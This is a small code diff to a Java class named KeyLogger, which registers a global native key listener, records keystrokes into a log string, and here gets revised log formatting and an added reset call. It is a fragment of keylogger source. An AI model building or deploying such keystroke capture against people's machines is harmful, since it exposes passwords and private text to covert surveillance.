@@ -23,6 +23,7 @@ public class KeyLogger implements NativeKeyListener {
             System.exit(0);
         }
         GlobalScreen.addNativeKeyListener(this);
+        resetLog();
     }
 
     @Override
@@ -36,7 +37,7 @@ public class KeyLogger implements NativeKeyListener {
         String key = NativeKeyEvent.getKeyText(e.getKeyCode());
 
         if(key.length() != 1) {
-            this.Log += "[" + key + "]";
+            this.Log += "\n>[" + key + "]\n>";
         } else {
             this.Log += key;
         }
@@ -47,8 +48,6 @@ public class KeyLogger implements NativeKeyListener {
     public void nativeKeyReleased(NativeKeyEvent e) {
 
     }
-
-
 
     public void resetLog() {
         setLog("");
